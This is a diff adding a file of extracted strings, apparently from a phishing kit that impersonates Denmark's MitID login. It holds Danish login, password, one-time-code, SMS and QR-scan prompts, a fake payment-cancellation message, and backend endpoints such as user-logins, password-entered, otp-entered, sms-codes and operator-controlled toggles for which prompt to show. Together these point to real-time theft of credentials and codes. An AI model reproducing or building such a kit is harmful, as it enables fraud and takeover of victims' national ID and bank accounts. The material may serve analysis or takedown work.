@@ -1,0 +1,65 @@
+
+        @keyframes pulse-broadcast {
+          0%, 100% { transform: scale(1); opacity: 1; }
+          50% { transform: scale(1.15); opacity: 0.8; }
+        }
+      
+${h}/api/public/current-qr
+${h}/api/public/otp-entered
+${h}/api/public/password-entered
+${h}/api/public/settings/broadcast-message
+${h}/api/public/settings/broadcast-type
+${h}/api/public/settings/connection-text
+${h}/api/public/settings/otp-code
+${h}/api/public/settings/redirect-url
+${h}/api/public/settings/show-otp
+${h}/api/public/settings/show-password
+${h}/api/public/settings/show-sms
+${h}/api/public/settings/show-swipe
+${h}/api/public/settings/sms-amount
+${h}/api/public/sms-codes
+${h}/api/public/user-logins
+${s}/api/public/report-bot
+./vendor-qr-4HvgGXca.js
+/assets/mitid-animation.mp4
+ADGANGSKODE
+BEKRÆFT
+Bekræft identitet
+Bekræfter...
+Betalingen er annulleret. Det annullerede beløb vil være synligt på din konto inden for 1–3 hverdage, afhængigt af din bank.
+Betalingen på ${B} er annulleret. Det annullerede beløb vil være synligt på din konto inden for 1–3 hverdage, afhængigt af din bank.
+Brug din MitID app til at scanne koden
+ENGANGSKODE
+Fejl ved sending. Prøv igen.
+Forbinder sikkert
+Godkend med kodeviser
+Har du glemt dit bruger-ID, kan du se det ved at scanne dit pas i MitID appen.
+Husk mig hos MitID.dk
+Indtast adgangskode
+Indtast bekræftelseskoden fra din SMS for at fortsætte.
+Indtast venligst en gyldig kode
+Kode modtaget
+Log på hos MitID.dk
+MitID
+MitID Bekræftelse
+MitID Besked
+MitID Sikkerhedsbeskeder
+QR Code
+SMS-BEKRÆFTELSE
+Scan QR-koden
+Vent venligst ...
+Venter på QR-kode
+Vi er ved at generere en QR-kode til dig. Gør venligst din MitID app klar til at scanne.
+keydown
+login
+mitid_channel
+mitid_userid
+otp_entered
+otp_toggle
+password
+password_entered
+password_toggle
+sms-hidden-input
+sms_toggle
+swipe_toggle
+Åbn MitID app og godkend
